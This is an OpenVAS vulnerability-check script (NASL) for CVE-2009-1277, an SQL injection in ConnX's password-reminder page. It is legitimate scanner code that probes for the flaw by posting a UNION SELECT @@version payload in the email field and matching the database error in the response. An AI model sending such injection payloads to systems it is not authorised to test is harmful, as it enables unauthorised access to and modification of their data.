###############################################################################
# OpenVAS Vulnerability Test
# $Id: ConnX_34388.nasl 14031 2019-03-07 10:47:29Z cfischer $
#
# ConnX 'frmLoginPwdReminderPopup.aspx' SQL Injection Vulnerability
#
# Authors
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:connx:connx";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100115");
  script_version("$Revision: 14031 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-07 11:47:29 +0100 (Thu, 07 Mar 2019) $");
  script_tag(name:"creation_date", value:"2009-04-08 20:52:50 +0200 (Wed, 08 Apr 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-1277");
  script_bugtraq_id(34370);

  script_name("ConnX 'frmLoginPwdReminderPopup.aspx' SQL Injection Vulnerability");

  script_tag(name:"solution_type", value:"VendorFix");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("ConnX_detect.nasl");
  script_mandatory_keys("connx/installed");

  script_tag(name:"summary", value:"ConnX is prone to an unspecified SQL-injection vulnerability because it fails
  to sufficiently sanitize user-supplied data before using it in a SQL query.");

  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker to compromise the application,
  access or modify data, or exploit latent vulnerabilities in the underlying database.");

  script_tag(name:"affected", value:"ConnX 4.0.20080606 is vulnerable. Other versions may also be affected.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34370");

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

variables = "__EVENTTARGET=&__EVENTARGUMENT=&ctl00%24hfLoad=&ctl00%24txtFilter=&ctl00%24txtHelpFile=&ctl00%24txtReportsButtonOffset=70&ctl00%24cphMainContent%24txtEmail=++'+union+select+%40%40version%3B--&ctl00%24cphMainContent%24cbSubmit=Submit&ctl00%24txtCurrentFavAdd=&ctl00%24hfFavsTrigger=";

filename = dir + "/frmLoginPwdReminderPopup.aspx";
host = http_host_name(port: port);

req = string( "POST ", filename, " HTTP/1.0\r\n",
              "Referer: ","http://", host, filename, "\r\n",
              "Host: ", host, "\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: ", strlen(variables),
              "\r\n\r\n",
              variables );
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
if (!buf)
  exit(0);

if (egrep(pattern:"Syntax error converting the nvarchar value", string: buf,icase:TRUE)) {
  report = report_vuln_url(port:port, url:filename);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);